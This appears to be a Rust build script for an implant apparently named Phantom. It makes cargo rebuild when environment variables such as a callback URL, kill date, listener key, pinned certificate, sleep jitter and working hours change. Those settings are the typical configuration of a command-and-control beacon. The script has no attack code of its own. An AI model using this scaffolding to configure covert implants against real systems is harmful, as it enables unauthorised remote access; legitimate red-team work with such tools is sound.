fn main() {
    for suffix in [
        "CALLBACK_URL",
        "INIT_SECRET",
        "INIT_SECRET_VERSION",
        "KILL_DATE",
        "LISTENER_PUB_KEY",
        "PINNED_CERT_PEM",
        "SLEEP_DELAY_MS",
        "SLEEP_JITTER",
        "USER_AGENT",
        "WORKING_HOURS",
    ] {
        println!("cargo::rerun-if-env-changed=PHANTOM_{suffix}");
    }
}
